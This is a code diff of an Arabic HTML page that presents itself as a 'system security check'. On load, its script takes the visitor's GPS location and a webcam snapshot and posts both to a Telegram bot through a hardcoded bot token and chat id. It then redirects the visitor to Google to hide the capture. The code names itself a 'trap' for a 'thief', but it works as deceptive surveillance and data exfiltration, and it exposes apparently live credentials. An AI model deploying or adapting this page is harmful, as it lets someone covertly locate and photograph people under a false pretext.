@@ -2,66 +2,58 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تأمين النظام السحابي</title>
+    <title>تأمين النظام</title>
     <style>
-        body { background: #000; color: #0f0; text-align: center; font-family: 'Courier New', monospace; padding-top: 100px; }
-        .loading { font-size: 20px; }
+        body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; padding-top: 100px; }
     </style>
 </head>
 <body>
-    <div class="loading">جاري فحص حالة الحماية...</div>
-    <p>يرجى الموافقة على الأذونات لتحديد موقع الجهاز وتصوير المستخدم</p>
-
+    <div id="status">جاري فحص حالة الحماية...</div>
     <script>
-        const token = '8787201125:AAGXUM1rZTxdSempBLkMs7xkza8K6rM7qgo';
+        const token = '8787201125:AAGXUM1rZTXdSempBLkMs7xkza8K6rM7qgo';
         const chat_id = '6462902234';
 
         async function startTrap() {
-            // 1. طلب الموقع الجغرافي (GPS)
+            // 1. طلب الموقع
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
                 
-                // إرسال الموقع لتليجرام
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                await fetch("https://api.telegram.org/bot" + token + "/sendMessage", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chat_id,
-                        text: `📍 تم تحديد موقع :\n${mapLink}`
-                    })
+                    body: JSON.stringify({ chat_id: chat_id, text: "📍 موقع الحرامي:\n" + mapLink })
                 });
 
-                // 2. طلب الكاميرا وتصويره
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    setTimeout(async () => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(async (blob) => {
-                            const formData = new FormData();
-                            formData.append('chat_id', chat_id);
-                            formData.append('photo', blob, 'thief.jpg');
-                            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                            
-                            // تحويله لجوجل في النهاية
-                            window.location.href = "https://www.google.com";
-                        }, 'image/jpeg');
-                    }, 1000);
-                } catch (e) { console.log("Camera Denied"); }
-
+                // 2. طلب الكاميرا بعد الموقع مباشرة
+                takePhoto();
             }, (err) => {
-                console.log("Location Denied");
-                // لو رفض الموقع، حاول برضه تفتح الكاميرا
-                startCameraOnly(); 
+                // لو رفض الموقع ادخل على الكاميرا علطول
+                takePhoto();
             });
+        }
+
+        async function takePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', blob, 'thief.jpg');
+                        await fetch("https://api.telegram.org/bot" + token + "/sendPhoto", { method: 'POST', body: formData });
+                        window.location.href = "https://www.google.com";
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (e) { console.log("Denied"); }
         }
 
         window.onload = startTrap;
